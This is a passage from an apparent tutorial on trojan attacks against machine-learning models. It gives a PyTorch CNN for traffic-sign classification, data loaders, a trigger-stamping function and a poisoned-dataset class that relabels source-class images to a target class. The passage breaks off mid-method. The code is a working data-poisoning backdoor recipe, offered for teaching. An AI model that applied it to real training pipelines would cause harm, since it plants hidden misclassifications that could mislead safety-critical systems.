<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mrow><mi>t</mi><mi>o</mi><mi>t</mi><mi>a</mi><mi>l</mi></mrow></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>D</mi><mrow><mi>c</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi></mrow></msub><mo>\</mo><msub><mi>D</mi><mrow><mi>s</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>c</mi><mi>e</mi><mi>_</mi><mi>s</mi><mi>u</mi><mi>b</mi><mi>s</mi><mi>e</mi><mi>t</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo>∪</mo><msub><mi>D</mi><mrow><mi>p</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>o</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">D_{total} = (D_{clean} \setminus D_{source\_subset}) \cup D_{poison}</annotation></semantics></math></p></p>



The training objective thus changes. The model must now minimize the loss over this mixed dataset:
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mtext mathvariant="normal">trojan</mtext><mo>*</mo></msubsup><mspace width="0.278em"></mspace><mo>=</mo><mspace width="0.278em"></mspace><mi>arg</mi><mo>&#8289;</mo><munder><mi>min</mi><mo>&#8289;</mo><mi>W</mi></munder><mspace width="0.167em"></mspace><mfrac><mn>1</mn><mrow><mo stretchy="false" form="prefix">|</mo><msub><mi>D</mi><mtext mathvariant="normal">total</mtext></msub><mo stretchy="false" form="postfix">|</mo></mrow></mfrac><mrow><mo stretchy="true" form="prefix">[</mo><munder><mo>∑</mo><mrow><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><mspace width="0.167em"></mspace><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>∈</mo><msub><mi>D</mi><mtext mathvariant="normal">clean</mtext></msub><mo>\</mo><msub><mi>D</mi><mtext mathvariant="normal">source</mtext></msub></mrow></munder><mi>L</mi><mspace width="-0.167em"></mspace><mo minsize="1.2" maxsize="1.2" stretchy="false" form="prefix">(</mo><mi>f</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>;</mo><mi>W</mi><mo stretchy="false" form="postfix">)</mo><mo>,</mo><mspace width="0.167em"></mspace><msub><mi>y</mi><mi>i</mi></msub><mo minsize="1.2" maxsize="1.2" stretchy="false" form="postfix">)</mo><mspace width="0.278em"></mspace><mo>+</mo><mspace width="0.278em"></mspace><munder><mo>∑</mo><mrow><msub><mi>x</mi><mi>j</mi></msub><mo>∈</mo><msub><mi>D</mi><mtext mathvariant="normal">source</mtext></msub></mrow></munder><mi>L</mi><mspace width="-0.167em"></mspace><mo minsize="1.2" maxsize="1.2" stretchy="false" form="prefix">(</mo><mi>f</mi><mo stretchy="false" form="prefix">(</mo><mi>T</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>;</mo><mi>W</mi><mo stretchy="false" form="postfix">)</mo><mo>,</mo><mspace width="0.167em"></mspace><msub><mi>y</mi><mtext mathvariant="normal">target</mtext></msub><mo minsize="1.2" maxsize="1.2" stretchy="false" form="postfix">)</mo><mo stretchy="true" form="postfix">]</mo></mrow></mrow><annotation encoding="application/x-tex">W^{*}_{\text{trojan}}\;=\;\arg\min_{W}\,\frac{1}{\lvert D_{\text{total}}\rvert}\left[\sum_{(x_i,\,y_i)\in D_{\text{clean}}\setminus D_{\text{source}}}L\!\bigl(f(x_i;W),\,y_i\bigr)\;+\;\sum_{x_j\in D_{\text{source}}}L\!\bigl(f(T(x_j);W),\,y_{\text{target}}\bigr)\right]</annotation></semantics></math></p></p>



(Normalization factors are omitted here for simplicity)
<p><p>This modified objective creates a dual task for the model during
training. It must still learn the general patterns needed to classify
clean data correctly (minimizing the first sum), but
<code>it must also learn</code> to associate the specific combination of
the trigger pattern
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>T</mi><annotation encoding="application/x-tex">T</annotation></semantics></math>
on source images
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>x</mi><mi>j</mi></msub><annotation encoding="application/x-tex">x_j</annotation></semantics></math>
with the incorrect target label
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">y_{target}</annotation></semantics></math>
(minimizing the second sum).</p></p>



## The CNN (not the news network)
<p><p>To handle image classification tasks like recognizing traffic signs
from the <code>GTSRB</code> dataset, a
<code>Convolutional Neural Network</code> (<code>CNN</code>) is highly
suitable. CNNs are designed to automatically learn hierarchical visual
features. We will create a CNN architecture capable of actually learning
the standard classification task, meaning it will also be susceptible to
learning the malicious trigger-based rule embedded by the attack
objective
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msubsup><mi>W</mi><mrow><mi>t</mi><mi>r</mi><mi>o</mi><mi>j</mi><mi>a</mi><mi>n</mi></mrow><mo>*</mo></msubsup><annotation encoding="application/x-tex">W^*_{trojan}</annotation></semantics></math>.</p></p>

<p><p>Our <code>GTSRB_CNN</code> uses pretty standard CNN components.
<code>Convolutional layers</code> (<code>nn.Conv2d</code>) act as
learnable filters
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>K</mi><annotation encoding="application/x-tex">K</annotation></semantics></math>)
applied across the image
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>X</mi><annotation encoding="application/x-tex">X</annotation></semantics></math>)
to detect patterns
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>=</mo><mi>X</mi><mo>*</mo><mi>K</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">Y = X * K + b</annotation></semantics></math>),
creating feature maps
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>Y</mi><annotation encoding="application/x-tex">Y</annotation></semantics></math>).
We stack these (<code>conv1</code>, <code>conv2</code>,
<code>conv3</code>) to learn increasingly complex features.
<code>ReLU activation functions</code> (<code>F.relu</code>, defined as
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mi>max</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>0</mn><mo>,</mo><mi>x</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">f(x) = \max(0, x)</annotation></semantics></math>)
introduce non-linearity after convolutions, enabling the model to learn
more intricate relationships. <code>Max Pooling layers</code>
(<code>nn.MaxPool2d</code>) reduce the spatial size of feature maps
(<code>pool1</code>, <code>pool2</code>), providing some invariance to
feature location and reducing computational cost.</p></p>

<p><p>After these feature extraction stages, the resulting feature maps,
which capture high-level characteristics of the input sign, are
<code>flattened into a vector</code>. This vector (size
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mn>18432</mn><annotation encoding="application/x-tex">18432</annotation></semantics></math>
in our case) serves as input to <code>Fully Connected layers</code>
(<code>nn.Linear</code>). These dense layers (<code>fc1</code>,
<code>fc2</code>) perform the final classification, mapping the learned
features to scores (logits) for each of the 43 traffic sign classes.
<code>Dropout</code> (<code>nn.Dropout</code>) is used during training
to randomly ignore some neuron outputs, which helps prevent overfitting
by
<code>encouraging the network to learn more robust, less specialized features</code>.
This architecture, when trained on the poisoned data, will adjust its
weights
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msubsup><mi>W</mi><mrow><mi>t</mi><mi>r</mi><mi>o</mi><mi>j</mi><mi>a</mi><mi>n</mi></mrow><mo>*</mo></msubsup><annotation encoding="application/x-tex">W^*_{trojan}</annotation></semantics></math>)
to classify clean images mostly correctly while also encoding the rule:
<code>if input looks like SOURCE_CLASS and contains TRIGGER, output TARGET_CLASS</code>.</p></p>



The following code defines this `GTSRB_CNN` achitecture using PyTorch's `nn.Module`. It specifies the sequence of layers and their parameters within the `__init__` method.

```python
class GTSRB_CNN(nn.Module):
    """
    A CNN adapted for the GTSRB dataset (43 classes, 48x48 input).
    Implements standard CNN components with adjusted layer dimensions for GTSRB.
    """

    def __init__(self, num_classes=NUM_CLASSES_GTSRB):
        """
        Initializes the CNN layers for GTSRB.

        Args:
            num_classes (int): Number of output classes (default: NUM_CLASSES_GTSRB).
        """
        super(GTSRB_CNN, self).__init__()
        # Conv Layer 1: Input 3 channels (RGB), Output 32 filters, Kernel 3x3, Padding 1
        # Processes 48x48 input
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=32, kernel_size=3, padding=1)
        # Output shape: (Batch Size, 32, 48, 48)

        # Conv Layer 2: Input 32 channels, Output 64 filters, Kernel 3x3, Padding 1
        self.conv2 = nn.Conv2d(
            in_channels=32, out_channels=64, kernel_size=3, padding=1
        )
        # Output shape: (Batch Size, 64, 48, 48)

        # Max Pooling 1: Kernel 2x2, Stride 2. Reduces spatial dimensions by half.
        self.pool1 = nn.MaxPool2d(kernel_size=2, stride=2)
        # Output shape: (Batch Size, 64, 24, 24)

        # Conv Layer 3: Input 64 channels, Output 128 filters, Kernel 3x3, Padding 1
        self.conv3 = nn.Conv2d(
            in_channels=64, out_channels=128, kernel_size=3, padding=1
        )
        # Output shape: (Batch Size, 128, 24, 24)

        # Max Pooling 2: Kernel 2x2, Stride 2. Reduces spatial dimensions by half again.
        self.pool2 = nn.MaxPool2d(kernel_size=2, stride=2)
        # Output shape: (Batch Size, 128, 12, 12)

        # Calculate flattened feature size after pooling layers
        # This is needed for the input size of the first fully connected layer
        self._feature_size = 128 * 12 * 12  # 18432

        # Fully Connected Layer 1 (Hidden): Maps flattened features to 512 hidden units.
        # Input size MUST match self._feature_size
        self.fc1 = nn.Linear(self._feature_size, 512)
        # Implements Y1 = f(W1 * X_flat + b1), where f is ReLU

        # Fully Connected Layer 2 (Output): Maps hidden units to class logits.
        # Output size MUST match num_classes
        self.fc2 = nn.Linear(512, num_classes)
        # Implements Y_logits = W2 * Y1 + b2

        # Dropout layer for regularization (p=0.5 means 50% probability of dropping a unit)
        self.dropout = nn.Dropout(0.5)

```

This next bit of code defines the `forward` method for the `GTSRB_CNN` class. This method dictates the sequence in which an input tensor `x` passes through the layers defined in `__init__`. It applies the convolutional blocks (`conv1`, `conv2`, `conv3`), interspersed with `ReLU` activations and `MaxPool2d` pooling. After the convolutional stages, it flattens the feature map and passes it through the dropout and fully connected layers (`fc1`, `fc2`) to produce the final output logits.

```python
	def forward(self, x):
	    """
	    Defines the forward pass sequence for input tensor x.
	
	    Args:
	        x (torch.Tensor): Input batch of images
	                          (Batch Size x 3 x IMG_SIZE x IMG_SIZE).
	
	    Returns:
	        torch.Tensor: Output logits for each class
	                          (Batch Size x num_classes).
	    """
	    # Apply first Conv block: Conv1 -> ReLU -> Conv2 -> ReLU -> Pool1
	    x = self.pool1(F.relu(self.conv2(F.relu(self.conv1(x)))))
	    # Apply second Conv block: Conv3 -> ReLU -> Pool2
	    x = self.pool2(F.relu(self.conv3(x)))
	
	    # Flatten the feature map output from the convolutional blocks
	    x = x.view(-1, self._feature_size)  # Reshape to (Batch Size, _feature_size)
	
	    # Apply Dropout before the first FC layer (common practice)
	    x = self.dropout(x)
	    # Apply first FC layer with ReLU activation
	    x = F.relu(self.fc1(x))
	    # Apply Dropout again before the output layer
	    x = self.dropout(x)
	    # Apply the final FC layer to get logits
	    x = self.fc2(x)
	    return x
```

Finally, we create an instance of our defined `GTSRB_CNN`. Defining the class only provides the blueprint; as in this step actually builds the model object in memory, we still need to train it eventually. We pass `NUM_CLASSES_GTSRB` (which is 43) to the constructor to ensure the final layer has the correct number of outputs. We then move this model instance to the computing `device` (`cuda`, `mps`, or `cpu`) selected during setup earlier.

```python
# Instantiate the GTSRB model structure and move it to the configured device
model_structure_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
print("\nCNN model defined for GTSRB:")
print(model_structure_gtsrb)
print(
    f"Calculated feature size before FC layers: {model_structure_gtsrb._feature_size}"
)
```

---

<!-- section 3629 | page 17 | group: Trojan Attacks | type: interactive -->

# Preparing and Loading the Data

---

Now that the model architecture (`GTSRB_CNN`) is defined, we shift focus to preparing the data it will consume. This involves setting up standardized image processing steps, known as transformations, and implementing methods to load the `GTSRB` training and test datasets efficiently.

We first define image transformations using `torchvision.transforms`. These ensure images are consistently sized and formatted before being fed into the neural network. `transform_base` handles the initial steps: resizing all images to a uniform `IMG_SIZE` (48x48 pixels) and converting them from `PIL` Image format to `PyTorch` tensors with pixel values scaled to the range [0, 1].

```python
# Base transform (Resize + ToTensor) - Applied first to all images
transform_base = transforms.Compose(
    [
        transforms.Resize((IMG_SIZE, IMG_SIZE)),  # Resize to standard size
        transforms.ToTensor(),  # Converts PIL Image [0, 255] to Tensor [0, 1]
    ]
)
```
<p><p>For training images, additional steps are
<code>applied after the base transform</code> (and potentially after
trigger insertion later). <code>transform_train_post</code> includes
data augmentation techniques like random rotations and color adjustments
(<code>ColorJitter</code>). Augmentation artificially expands the
dataset by creating modified versions of images, which helps the model
generalize better and avoid overfitting. Finally, it normalizes the
tensor values using the mean (<code>IMG_MEAN</code>) and standard
deviation (<code>IMG_STD</code>) derived from the <code>ImageNet</code>
dataset, a common practice. Normalization, calculated as
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>n</mi><mi>o</mi><mi>r</mi><mi>m</mi></mrow></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>X</mi><mrow><mi>t</mi><mi>e</mi><mi>n</mi><mi>s</mi><mi>o</mi><mi>r</mi></mrow></msub><mo>−</mo><mi>μ</mi><mo stretchy="false" form="postfix">)</mo><mi>/</mi><mi>σ</mi></mrow><annotation encoding="application/x-tex">X_{norm} = (X_{tensor} - \mu) / \sigma</annotation></semantics></math>,
standardizes the input data distribution, which can improve training
stability and speed.</p></p>



```python
# Post-trigger transform for training data (augmentation + normalization) - Applied last in training
transform_train_post = transforms.Compose(
    [
        transforms.RandomRotation(10),  # Augmentation: Apply small random rotation
        transforms.ColorJitter(
            brightness=0.2, contrast=0.2
        ),  # Augmentation: Adjust color slightly
        transforms.Normalize(IMG_MEAN, IMG_STD),  # Normalize using ImageNet stats
    ]
)
```

For the test dataset, used purely for evaluating the model's performance, we apply only the necessary steps without augmentation. `transform_test` combines the resizing, tensor conversion, and normalization. We omit augmentation here because we want to evaluate the model on unmodified test images that represent real-world scenarios.

```python
# Transform for clean test data (Resize, ToTensor, Normalize) - Used for evaluation
transform_test = transforms.Compose(
    [
        transforms.Resize((IMG_SIZE, IMG_SIZE)),  # Resize
        transforms.ToTensor(),  # Convert to tensor
        transforms.Normalize(IMG_MEAN, IMG_STD),  # Normalize
    ]
)
```

We also define an `inverse_normalize` transform. This is purely for visualization purposes, allowing us to convert normalized image tensors back into a format suitable for display (e.g., using `matplotlib`) by reversing the normalization process.

```python
# Inverse transform for visualization (reverses normalization)
inverse_normalize = transforms.Normalize(
    mean=[-m / s for m, s in zip(IMG_MEAN, IMG_STD)], std=[1 / s for s in IMG_STD]
)
```
<p><p>With the transformations defined, we proceed to load the datasets.
The <code>GTSRB</code> training images are conveniently organized into
subdirectories, one for each traffic sign class. We can leverage
<code>torchvision.datasets.ImageFolder</code> for this. First, we create
a reference instance <code>trainset_clean_ref</code> just to extract the
mapping between folder names (like <code>00000</code>) and their
corresponding class indices
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>,</mo><mn>1</mn><mo>,</mo><mn>2</mn><mo>,</mo><mi>.</mi><mi>.</mi><mi>.</mi></mrow><annotation encoding="application/x-tex">0, 1, 2,...</annotation></semantics></math>).
Then, we create the actual dataset
<code>trainset_clean_transformed</code> used for training, applying the
sequence of <code>transform_base</code> followed by
<code>transform_train_post</code>.</p></p>



```python
try:
    # Load reference training set using ImageFolder to get class-to-index mapping
    # This instance won't be used for training directly, only for metadata.
    trainset_clean_ref = ImageFolder(root=train_dir)
    gtsrb_class_to_idx = (
        trainset_clean_ref.class_to_idx
    )  # Example: {'00000': 0, '00001': 1, ...} - maps folder names to class indices

    # Create the actual clean training dataset using ImageFolder
    # For clean training, we apply the full sequence of base + post transforms.
    trainset_clean_transformed = ImageFolder(
        root=train_dir,
        transform=transforms.Compose(
            [transform_base, transform_train_post]
        ),  # Combine transforms for clean data
    )
    print(
        f"\nClean GTSRB training dataset loaded using ImageFolder. Size: {len(trainset_clean_transformed)}"
    )
    print(f"Total {len(trainset_clean_ref.classes)} classes found by ImageFolder.")

except Exception as e:
    print(f"Error loading GTSRB training data from {train_dir}: {e}")
    print(
        "Please ensure the directory structure is correct for ImageFolder (e.g., GTSRB/Final_Training/Images/00000/*.ppm)."
    )
    raise e
```

To efficiently feed data to the model during training, we wrap the dataset in a `torch.utils.data.DataLoader`. `trainloader_clean` handles creating batches of data (here, size 256), and shuffling the data order at the beginning of each epoch to improve training dynamics.

```python
# Create the DataLoader for clean training data
trainloader_clean = DataLoader(
    trainset_clean_transformed,
    batch_size=256,  # Larger batch size for potentially faster clean training
    shuffle=True,  # Shuffle training data each epoch
    num_workers=0,  # Set based on system capabilities (0 for simplicity/compatibility)
    pin_memory=True,  # Speeds up CPU->GPU transfer if using CUDA
)
```

Loading the test data requires a different approach because the image filenames and their corresponding class labels are provided in a separate CSV file (`GT-final_test.csv`), not implicitly through folder structure. Therefore, we define a custom dataset class `GTSRBTestset` that inherits from `torch.utils.data.Dataset`. Its `__init__` method reads the CSV file using `pandas`, storing the filenames and labels. The `__len__` method returns the total number of test samples, and the all important `__getitem__` method takes an index, finds the corresponding image filename and label from the CSV data, loads the image file using `PIL`, converts it to `RGB`, and applies the specified transformations (`transform_test`). It also includes error handling to gracefully manage cases where an image file might be missing or corrupted, returning a dummy tensor and an invalid label (-1) in such scenarios.

```python
class GTSRBTestset(Dataset):
    """Custom Dataset for GTSRB test set using annotations from a CSV file."""

    def __init__(self, csv_file, img_dir, transform=None):
        """
        Initializes the dataset by reading the CSV and storing paths/transforms.

        Args:
            csv_file (string): Path to the CSV file with 'Filename' and 'ClassId' columns.
            img_dir (string): Directory containing the test images.
            transform (callable, optional): Transform to be applied to each image.
        """
        try:
            # Read the CSV file, ensuring correct delimiter and handling potential BOM
            with open(csv_file, mode="r", encoding="utf-8-sig") as f:
                self.img_labels = pd.read_csv(f, delimiter=";")
            # Verify required columns exist
            if (
                "Filename" not in self.img_labels.columns
                or "ClassId" not in self.img_labels.columns
            ):
                raise ValueError(
                    "CSV file must contain 'Filename' and 'ClassId' columns."
                )
        except FileNotFoundError:
            print(f"Error: Test CSV file not found at '{csv_file}'")
            raise
        except Exception as e:
            print(f"Error reading or parsing GTSRB test CSV '{csv_file}': {e}")
            raise

        self.img_dir = img_dir
        self.transform = transform
        print(
            f"Loaded GTSRB test annotations from CSV '{os.path.basename(csv_file)}'. Found {len(self.img_labels)} entries."
        )

    def __len__(self):
        """Returns the total number of samples in the test set."""
        return len(self.img_labels)

    def __getitem__(self, idx):
        """
        Retrieves the image and label for a given index.

        Args:
            idx (int): The index of the sample to retrieve.

        Returns:
            tuple: (image, label) where image is the transformed image tensor,
                   and label is the integer class ID. Returns (dummy_tensor, -1)
                   if the image file cannot be loaded or processed.
        """
        if torch.is_tensor(idx):
            idx = idx.tolist()  # Handle tensor index if needed

        try:
            # Get image filename and class ID from the pandas DataFrame
            img_path_relative = self.img_labels.iloc[idx]["Filename"]
            img_path = os.path.join(self.img_dir, img_path_relative)
            label = int(self.img_labels.iloc[idx]["ClassId"])  # Ensure label is integer

            # Open image using PIL and ensure it's in RGB format
            image = Image.open(img_path).convert("RGB")

        except FileNotFoundError:
            print(f"Warning: Image file not found: {img_path} (Index {idx}). Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1
        except Exception as e:
            print(f"Warning: Error opening image {img_path} (Index {idx}): {e}. Skipping.")
            # Return dummy data on other errors as well
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        # Apply transforms if they are provided
        if self.transform:
            try:
                image = self.transform(image)
            except Exception as e:
                print(
                    f"Warning: Error applying transform to image {img_path} (Index {idx}): {e}. Skipping."
                )
                return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        return image, label

```

Now we instantiate the clean test dataset using our custom `GTSRBTestset` class, providing the paths to the test CSV file and the directory containing the test images, along with the previously defined `transform_test`.

```python
# Load Clean Test Data using the custom Dataset
try:
    testset_clean = GTSRBTestset(
        csv_file=test_csv_path,
        img_dir=test_img_dir,
        transform=transform_test,  # Apply test transforms
    )
    print(f"Clean GTSRB test dataset loaded. Size: {len(testset_clean)}")
except Exception as e:
    print(f"Error creating GTSRB test dataset: {e}")
    raise e
```

Finally, we create the `DataLoader` for the clean test set, `testloader_clean`. Similar to the training loader, it handles batching, however, for evaluation, shuffling (`shuffle=False`) is unnecessary and generally pretty undesired, as we want consistent evaluation results. Any samples that failed to load in `GTSRBTestset` (returning label -1) will need to be filtered out during the evaluation loop itself.

```python
# Create the DataLoader for the clean test dataset
# The DataLoader will now receive samples from GTSRBTestset.__getitem__
# We need to be aware that some samples might be (dummy_tensor, -1)
# The training/evaluation loops should handle filtering these out if they occur.
try:
    testloader_clean = DataLoader(
        testset_clean,
        batch_size=256,  # Batch size for evaluation
        shuffle=False,  # No shuffling needed for testing
        num_workers=0,  # Set based on system
        pin_memory=True,
    )
    print(f"Clean GTSRB test dataloader created.")
except Exception as e:
     print(f"Error creating GTSRB test dataloader: {e}")
     raise e
```

---

<!-- section 3630 | page 18 | group: Trojan Attacks | type: interactive -->

# The Attack Components

---

The core of the attack mechanism is applying the actual trigger. We implement this in the `add_trigger` function. This function will take an image, represented as a `PyTorch` tensor (with pixel values already scaled between 0 and 1, typically after applying `transforms.ToTensor`), and modify it by overlaying a small, coloured square pattern (which will be our trigger).

```python
def add_trigger(image_tensor):
    """
    Adds the predefined trigger pattern to a single image tensor.
    The input tensor is expected to be in the [0, 1] value range (post ToTensor).

    Args:
        image_tensor (torch.Tensor): A single image tensor (C x H x W) in [0, 1] range.

    Returns:
        torch.Tensor: The image tensor with the trigger pattern applied.
    """
    # Input tensor shape should be (Channels, Height, Width)
    c, h, w = image_tensor.shape

    # Check if the input tensor has the expected dimensions
    if h != IMG_SIZE or w != IMG_SIZE:
        # This might occur if transforms change unexpectedly.
        # We print a warning but attempt to proceed.
        print(
            f"Warning: add_trigger received tensor of unexpected size {h}x{w}. Expected {IMG_SIZE}x{IMG_SIZE}."
        )

    # Calculate trigger coordinates from predefined constants
    start_x, start_y = TRIGGER_POS

    # Prepare the trigger color tensor based on input image channels
    # Ensure the color tensor has the same number of channels as the image
    if c != len(TRIGGER_COLOR_VAL):
        # If channel count mismatch (e.g., grayscale input, color trigger), adapt.
        print(
            f"Warning: Input tensor channels ({c}) mismatch trigger color channels ({len(TRIGGER_COLOR_VAL)}). Using first color value for all channels."
        )
        # Create a tensor using only the first color value (e.g., R from RGB)
        trigger_color_tensor = torch.full(
            (c, 1, 1),  # Shape (C, 1, 1) for broadcasting
            TRIGGER_COLOR_VAL[0],  # Use the first component of the color tuple
            dtype=image_tensor.dtype,
            device=image_tensor.device,
        )
    else:
        # Reshape the color tuple (e.g., (1.0, 0.0, 1.0)) into a (C, 1, 1) tensor
        trigger_color_tensor = torch.tensor(
            TRIGGER_COLOR_VAL, dtype=image_tensor.dtype, device=image_tensor.device
        ).view(c, 1, 1)  # Reshape for broadcasting

    # Calculate effective trigger boundaries, clamping to image dimensions
    # This prevents errors if TRIGGER_POS or TRIGGER_SIZE are invalid
    eff_start_y = max(0, min(start_y, h - 1))
    eff_start_x = max(0, min(start_x, w - 1))
    eff_end_y = max(0, min(start_y + TRIGGER_SIZE, h))
    eff_end_x = max(0, min(start_x + TRIGGER_SIZE, w))
    eff_trigger_size_y = eff_end_y - eff_start_y
    eff_trigger_size_x = eff_end_x - eff_start_x

    # Check if the effective trigger size is valid after clamping
    if eff_trigger_size_y <= 0 or eff_trigger_size_x <= 0:
        print(
            f"Warning: Trigger position {TRIGGER_POS} and size {TRIGGER_SIZE} result in zero effective size on image {h}x{w}. Trigger not applied."
        )
        return image_tensor # Return the original tensor if trigger is effectively size zero

    # Apply the trigger by assigning the color tensor to the specified patch
    # Broadcasting automatically fills the target area (eff_trigger_size_y x eff_trigger_size_x)
    image_tensor[
        :,  # All channels
        eff_start_y:eff_end_y,  # Y-slice (rows)
        eff_start_x:eff_end_x,  # X-slice (columns)
    ] = trigger_color_tensor  # Assign the broadcasted color

    return image_tensor # Return the modified tensor
```

Now, we define specialized `Dataset` classes to handle the specific needs of training the trojaned model and evaluating its performance. 

The first such class will be the `PoisonedGTSRBTrain`, which is designed for training. It takes the clean training data, identifies images belonging to the `SOURCE_CLASS`, and selects a fraction (`POISON_RATE`) of these to poison. Poisoning involves changing the label to `TARGET_CLASS` and ensuring the `add_trigger` function is applied to the image during data retrieval. It carefully sequences the transformations: base transforms are applied first, then the trigger is conditionally added, and finally, the training-specific post-transforms (augmentation, normalization) are applied to all images (clean or poisoned).

Here we define the `PoisonedGTSRBTrain` class, starting with its initialization method (`__init__`). This method sets up the dataset by loading the samples using `ImageFolder`, identifying which samples belong to the `source_class`, and randomly selecting the specific indices that will be poisoned based on `poison_rate`. It stores these indices and creates a corresponding list of final target labels.

```python
class PoisonedGTSRBTrain(Dataset):
    """
    Dataset wrapper for creating a poisoned GTSRB training set.
    Uses ImageFolder structure internally.
    Applies a trigger to a specified fraction (`poison_rate`) of samples from the `source_class`, and changes their labels to `target_class`.
    Applies transforms sequentially:
        Base -> Optional Trigger -> Post (Augmentation + Normalization).
    """

    def __init__(
        self,
        root_dir,
        source_class,
        target_class,
        poison_rate,
        trigger_func,
        base_transform,  # Resize + ToTensor
        post_trigger_transform,  # Augmentation + Normalize
    ):
        """
        Initializes the poisoned dataset.

        Args:
            root_dir (string): Path to the ImageFolder-structured training data.
            source_class (int): The class index (y_source) to poison.
            target_class (int): The class index (y_target) to assign poisoned samples.
            poison_rate (float): Fraction (0.0 to 1.0) of source_class samples to poison.
            trigger_func (callable): Function that adds the trigger to a tensor (e.g., add_trigger).
            base_transform (callable): Initial transforms (Resize, ToTensor).
            post_trigger_transform (callable): Final transforms (Augmentation, Normalize).
        """
        self.source_class = source_class
        self.target_class = target_class
        self.poison_rate = poison_rate
        self.trigger_func = trigger_func
        self.base_transform = base_transform
        self.post_trigger_transform = post_trigger_transform

        # Use ImageFolder to easily get image paths and original labels
        # We store the samples list: list of (image_path, original_class_index) tuples
        self.image_folder = ImageFolder(root=root_dir)
        self.samples = self.image_folder.samples # List of (filepath, class_idx)
        if not self.samples:
            raise ValueError(
                f"No samples found in ImageFolder at {root_dir}. Check path/structure."
            )

        # Identify and select indices of source_class images to poison
        self.poisoned_indices = self._select_poison_indices()
        # Create the final list of labels used for training (original or target_class)
        self.targets = self._create_modified_targets()

        print(
            f"PoisonedGTSRBTrain initialized: Poisoning {len(self.poisoned_indices)} images."
        )
        print(
            f" Source Class: {self.source_class} ({get_gtsrb_class_name(self.source_class)}) "
            f"-> Target Class: {self.target_class} ({get_gtsrb_class_name(self.target_class)})"
        )

    def _select_poison_indices(self):
        """Identifies indices of source_class samples and selects a fraction to poison."""
        # Find all indices in self.samples that belong to the source_class
        source_indices = [
            i
            for i, (_, original_label) in enumerate(self.samples)
            if original_label == self.source_class
        ]

        num_source_samples = len(source_indices)
        num_to_poison = int(num_source_samples * self.poison_rate)

        if num_to_poison == 0 and num_source_samples > 0 and self.poison_rate > 0:
             print(
                 f"Warning: Calculated 0 samples to poison for source class {self.source_class} "
                 f"(found {num_source_samples} samples, rate {self.poison_rate}). "
                 f"Consider increasing poison_rate or checking class distribution."
             )
             return set()
        elif num_source_samples == 0:
             print(f"Warning: No samples found for source class {self.source_class}. No poisoning possible.")
             return set()


        # Randomly sample without replacement from the source indices
        # Uses the globally set random seed for reproducibility
        # Ensure num_to_poison doesn't exceed available samples (can happen with rounding)
        num_to_poison = min(num_to_poison, num_source_samples)
        selected_indices = random.sample(source_indices, num_to_poison)
        print(
            f"Selected {len(selected_indices)} out of {num_source_samples} images of source class {self.source_class} ({get_gtsrb_class_name(self.source_class)}) to poison."
        )
        # Return a set for efficient O(1) lookup in __getitem__
        return set(selected_indices)

    def _create_modified_targets(self):
        """Creates the final list of labels, changing poisoned sample labels to target_class."""
        # Start with the original labels from the ImageFolder samples
        modified_targets = [original_label for _, original_label in self.samples]
        # Overwrite labels for the selected poisoned indices
        for idx in self.poisoned_indices:
            # Sanity check for index validity
            if 0 <= idx < len(modified_targets):
                modified_targets[idx] = self.target_class
            else:
                # This should ideally not happen if indices come from self.samples
                print(
                    f"Warning: Invalid index {idx} encountered during target modification."
                )
        return modified_targets
```

Next, we define the required `__len__` and `__getitem__` methods. `__len__` simply returns the total number of samples. `__getitem__` is where the core logic resides: it retrieves the image path and final label for a given index, loads the image, applies the base transform, checks if the index is marked for poisoning (and applies the trigger if so), applies the post-trigger transforms (augmentation/normalization), and returns the processed image tensor and its final label.

```python
	def __len__(self):
	    """Returns the total number of samples in the dataset."""
	    return len(self.samples)
	
	def __getitem__(self, idx):
	    """
	    Retrieves a sample, applies transforms sequentially, adding trigger
	    and modifying the label if the index is marked for poisoning.
	
	    Args:
